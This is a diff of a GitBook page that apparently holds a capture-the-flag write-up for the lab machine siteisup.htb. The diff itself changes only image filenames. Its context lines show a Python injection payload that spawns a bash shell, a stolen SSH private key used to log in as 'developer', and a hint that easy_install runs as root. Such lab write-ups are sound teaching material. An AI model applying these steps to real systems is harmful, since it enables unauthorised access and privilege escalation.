@@ -426,7 +426,7 @@ __import__('os').system('bash')
 
 I'll grab the ssh key for ease of access and a better shell
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```shellscript
 vi developer_id_rsa
@@ -434,11 +434,11 @@ chmod 600 developer_id_rsa
 ssh -i developer_id_rsa developer@siteisup.htb
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### <mark style="color:blue;">Manual Enumeration</mark>
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 developer can run `easy_install` as root without a password
 
